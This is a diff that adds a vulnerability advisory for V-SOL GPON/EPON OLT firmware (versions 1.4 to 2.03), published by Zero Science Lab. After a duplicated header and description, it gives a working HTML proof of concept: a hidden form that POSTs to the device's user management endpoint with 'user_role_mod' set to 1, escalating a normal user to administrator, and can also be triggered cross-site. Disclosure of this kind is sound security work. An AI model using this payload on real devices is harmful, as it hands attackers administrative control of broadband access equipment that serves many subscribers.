@@ -1,0 +1,80 @@
+# Exploit Title: V-SOL GPON/EPON OLT Platform 2.03 - Remote Privilege Escalation
+# Author: LiquidWorm 
+# Discovery Date: 2019-09-26 
+# Vendor: Guangzhou V-SOLUTION Electronic Technology Co., Ltd.
+# Product web page: https://www.vsolcn.com
+# Tested on: GoAhead-Webs
+# Advisory ID: ZSL-2019-5538
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5538.php
+# Affected version: V2.03.62R_IPv6
+# V2.03.54R
+# V2.03.52R
+# V2.03.49
+# V2.03.47
+# V2.03.40
+# V2.03.26
+# V2.03.24
+# V1.8.6
+# V1.4
+
+Summary: GPON is currently the leading FTTH standard in broadband access
+technology being widely deployed by service providers around the world.
+GPON/EPON OLT products are 1U height 19 inch rack mount products. The
+features of the OLT are small, convenient, flexible, easy to deploy, high
+performance. It is appropriate to be deployed in compact room environment.
+The OLTs can be used for 'Triple-Play', VPN, IP Camera, Enterprise LAN and
+ICT applications.
+
+Desc: The application interface allows users to perform certain actions via
+HTTP requests without performing any validity checks to verify the requests.
+This can be exploited to perform certain actions with administrative privileges
+if a logged-in user visits a malicious web site.
+
+
+
+V-SOL GPON/EPON OLT Platform v2.03 Remote Privilege Escalation
+
+
+Vendor: Guangzhou V-SOLUTION Electronic Technology Co., Ltd.
+Product web page: https://www.vsolcn.com
+Affected version: V2.03.62R_IPv6
+                  V2.03.54R
+                  V2.03.52R
+                  V2.03.49
+                  V2.03.47
+                  V2.03.40
+                  V2.03.26
+                  V2.03.24
+                  V1.8.6
+                  V1.4
+
+Summary: GPON is currently the leading FTTH standard in broadband access
+technology being widely deployed by service providers around the world.
+GPON/EPON OLT products are 1U height 19 inch rack mount products. The
+features of the OLT are small, convenient, flexible, easy to deploy, high
+performance. It is appropriate to be deployed in compact room environment.
+The OLTs can be used for 'Triple-Play', VPN, IP Camera, Enterprise LAN and
+ICT applications.
+
+Desc: The application suffers from a privilege escalation vulnerability.
+Normal user can elevate his/her privileges by sending a HTTP POST request
+setting the parameter 'user_role_mod' to integer value '1' gaining admin
+rights.
+
+
+<html>
+  <body>
+    <form action="http://192.168.8.200/action/user.html" method="POST">
+      <input type="hidden" name="user_name_add" value="" />
+      <input type="hidden" name="user_password_add" value="" />
+      <input type="hidden" name="password_confirm_add" value="" />
+      <input type="hidden" name="user_role" value="0" />
+      <input type="hidden" name="user_password_mod" value="test" />
+      <input type="hidden" name="password_confirm_mod" value="test" />
+      <input type="hidden" name="user_role_mod" value="1" />
+      <input type="hidden" name="option_um" value="17" />
+      <input type="hidden" name="who" value="1" />
+      <input type="submit" value="Escalate" />
+    </form>
+  </body>
+</html>
